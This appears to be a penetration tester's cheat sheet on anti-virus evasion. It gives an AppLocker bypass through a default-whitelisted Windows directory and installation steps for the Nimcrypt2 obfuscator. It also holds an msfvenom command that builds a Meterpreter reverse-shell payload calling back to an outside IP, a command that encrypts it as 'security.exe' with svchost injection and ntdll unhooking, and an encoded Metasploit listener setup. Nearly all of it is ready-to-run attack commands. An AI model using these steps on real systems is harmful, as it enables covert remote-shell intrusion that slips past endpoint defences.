# Anti-Virus Evasion

## Applocker

* AppLocker is an application whitelisting technology introduced with Windows 7.
* It allows restricting which programs users can execute based on the programs path, publisher and hash.
* If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory:

```
C:\Windows\System32\spool\drivers\color
```

* This is whitelisted by default.&#x20;

### Nimcrypt2

#### Help Menu&#x20;

```
Usage:
  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]
  nimcrypt (-h | --help)

Options:
  -h --help     Show this screen.
  --version     Show version.
  -f --file filename     File to load
  -t --type filetype     Type of file (csharp, raw, or pe)
  -p --process process   Name of process for shellcode injection
  -o --output filename   Filename for compiled exe
  -u --unhook            Unhook ntdll.dll
  -v --verbose           Enable verbose messages during execution
  -e --encrypt-strings   Encrypt strings using the strenc module
  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2
  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary
  -n --no-randomization  Disable syscall name randomization
  -s --no-sandbox        Disable sandbox checks
  --no-ppid-spoof        Disable PPID Spoofing
```

#### Installation&#x20;

```
git clone https://github.com/icyguider/Nimcrypt2.git
sudo apt install gcc mingw-w64 xz-utils git
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
echo "export PATH=$HOME/.nimble/bin:$PATH" >> ~/.bashrc
export PATH=$HOME/.nimble/bin:$PATH
nimble install winim nimcrypto docopt ptr_math strenc
cd /opt/Nimcrypt2
nim c -d=release --cc:gcc --embedsrc=on --hints=on --app=console --cpu=amd64 --out=nimcrypt nimcrypt.nim
```

* Nimcrypt2 is a fantastic option for obfuscating your binaries, works with sliver, msf, and more
* generate your payload

#### Metasploit with Nimcrypt&#x20;

```
//Payload Generation 
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.45 LPORT=443 --encoder x86/shikata_ga_nai -i 3 -f exe -o start.exe
```

* Now encrypt it with nimcrypt2

```
./nimcrypt -f start.exe -t pe -o security.exe -p svchost -e -u
```

### Metasploit Listener Obsfucation&#x20;

```
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.15.45
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp
set EXITFUNC thread
set autoloadstdapi false
set autosysteminfo false
set enablestageencoding true
set stageencoder x64/xor_dynamic
run -j
```

